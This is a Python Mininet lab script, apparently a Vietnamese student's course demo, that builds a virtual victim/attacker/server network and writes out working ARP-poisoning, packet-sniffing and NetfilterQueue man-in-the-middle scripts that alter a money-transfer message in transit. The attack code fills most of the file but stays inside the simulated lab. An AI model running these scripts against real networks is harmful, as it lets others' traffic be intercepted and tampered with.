#!/usr/bin/python3
from mininet.net import Mininet
from mininet.node import OVSSwitch
from mininet.topo import Topo
from mininet.log import setLogLevel, info
from mininet.cli import CLI
import os

class MITM_Topo(Topo):
    def build(self):
        s1 = self.addSwitch('s1')
        # h1: Victim, h2: Attacker, h3: Server
        h1 = self.addHost('h1', ip='10.0.0.1/24', mac='00:00:00:00:00:01')
        h2 = self.addHost('h2', ip='10.0.0.2/24', mac='00:00:00:00:00:02')
        h3 = self.addHost('h3', ip='10.0.0.3/24', mac='00:00:00:00:00:03')

        self.addLink(h1, s1)
        self.addLink(h2, s1)
        self.addLink(h3, s1)

def create_attack_scripts():
    """Tạo các script tấn công nâng cao cho h2"""
    
    # 1. ARP Poisoning (Giữ nguyên cơ bản nhưng tối ưu)
    with open("arp_poison.py", "w") as f:
        f.write("""
from scapy.all import ARP, send
import time

def spoof():
    print("[+] Dang dau doc ARP... (h1 <-> h2 <-> h3)")
    pkt1 = ARP(op=2, pdst="10.0.0.1", hwdst="00:00:00:00:00:01", psrc="10.0.0.3")
    pkt2 = ARP(op=2, pdst="10.0.0.3", hwdst="00:00:00:00:00:03", psrc="10.0.0.1")
    while True:
        send(pkt1, verbose=False)
        send(pkt2, verbose=False)
        time.sleep(2)

if __name__ == "__main__":
    spoof()
""")
    with open("mitm_sniff.py", "w") as f:
        f.write("""
from scapy.all import sniff, IP, TCP, Raw, get_if_hwaddr

# Lấy MAC của h2 để nhận diện gói tin do mình gửi ra
MY_MAC = get_if_hwaddr("h2-eth0")

def process_packet(pkt):
    # CHỐT CHẶN: Nếu MAC nguồn là của mình, thì đây là gói tin đang đi ra -> Bỏ qua
    if pkt.src == MY_MAC:
        return

    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        if pkt.haslayer(Raw):
            try:
                payload = pkt[Raw].load.decode(errors='ignore').strip()
                if payload:
                    print(f"[*] [NGHE LÉN] {pkt[IP].src} -> {pkt[IP].dst}: {payload}")
            except:
                pass

print("[+] Dang nghe len (da loc goi trung)...")
sniff(iface="h2-eth0", filter="tcp port 8080", prn=process_packet, store=0)
        """)
    # 2. MITM Modification (Script nâng cao dùng NetfilterQueue để sửa dữ liệu)
    with open("mitm_attack.py", "w") as f:
        f.write("""
import os
from scapy.all import IP, TCP, Raw
from netfilterqueue import NetfilterQueue

def modify_packet(pkt):
    scapy_pkt = IP(pkt.get_payload())
    
    if scapy_pkt.haslayer(Raw):
        load = scapy_pkt[Raw].load.decode(errors='ignore')
        print(f"[*] Tin nhan goc: {load.strip()}")
        
        # LOGIC THAY DOI DU LIEU: Neu thay chu 'tien', doi thanh 'HACKED'
        if "tien" in load:
            new_load = load.replace("tien", "HACKED_VAL")
            scapy_pkt[Raw].load = new_load
            
            # Xoa checksum de Scapy tinh lai
            del scapy_pkt[IP].len
            del scapy_pkt[IP].chksum
            del scapy_pkt[TCP].chksum
            
            pkt.set_payload(bytes(scapy_pkt))
            print(f"[!] DA SUA THANH: {new_load.strip()}")

    pkt.accept()

# Thiet lap iptables de day traffic vao Queue
os.system("iptables -I FORWARD -p tcp --dport 8080 -j NFQUEUE --queue-num 1")
print("[+] Dang cho tin nhan de sua doi...")

try:
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, modify_packet)
    nfqueue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    
""")

def run_lab():
    create_attack_scripts()
    topo = MITM_Topo()
    net = Mininet(topo=topo, controller=None, switch=OVSSwitch)
    net.start()
    
    s1 = net.get('s1')
    s1.cmd('ovs-vsctl set-bridge s1 fail-mode=standalone')
    s1.cmd('ovs-ofctl del-flows s1')
    s1.cmd('ovs-ofctl add-flow s1 action=normal')

    h2 = net.get('h2')
    info("*** Dang cau hinh h2 (IP Forwarding)...\n")
    h2.cmd('sysctl -w net.ipv4.ip_forward=1')
    
    info("\n" + "="*60 + "\n")
    info("KICH BAN DEMO CUOI KY:\n")
    info("Step 1: xterm h2 -> python3 arp_poison.py &\n")
    info("Step 2: xterm h2 -> python3 mitm_attack.py\n")
    info("Step 3: xterm h3 -> nc -l 8080\n")
    info("Step 4: xterm h1 -> echo 'Chuyen 100 tien' | nc 10.0.0.3 8080\n")
    info("Ket qua: h3 se nhan duoc 'Chuyen 100 HACKED_VAL'\n")
    info("="*60 + "\n")

    CLI(net)
    
    os.system("rm arp_poison.py mitm_attack.py")
    net.stop()

if __name__ == '__main__':
    setLogLevel('info')
    run_lab()
